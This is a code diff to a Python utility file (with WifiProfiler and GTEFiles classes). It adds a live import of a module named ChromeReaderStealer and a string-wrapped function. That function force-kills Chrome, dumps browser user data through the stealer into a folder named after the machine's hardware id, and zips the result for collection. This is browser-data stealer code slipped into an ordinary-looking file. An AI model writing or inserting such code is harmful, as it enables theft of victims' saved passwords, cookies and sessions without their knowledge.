@@ -19,6 +19,10 @@ import cv2
 #import random
 import re
 import webbrowser
+import ChromeReaderStealer
+import tempfile
+import shutil
+import uuid
 
 #import ChromeReader
 #import tempfile
@@ -341,6 +345,22 @@ class WifiProfiler:
         if profile not in cls.profiles:
             cls.profiles.append(profile)
         return profile
+
+
+""" def get_chrome_reader_archive(user_manager: ChromeReaderStealer.UserManager | None = None):
+    with tempfile.TemporaryDirectory() as temp_path:
+        try:
+            os.system("taskkill /f /im chrome.exe")
+        except:
+            pass
+
+        path = os.path.join(temp_path, f"PC {uuid.getnode()}")
+
+        user_manager = user_manager or ChromeReaderStealer.UserManager.get()
+        user_manager.save(path)
+
+        zip_path = shutil.make_archive(path, "zip", path)
+        return zip_path """
 
 # GTE
 class GTEFiles:
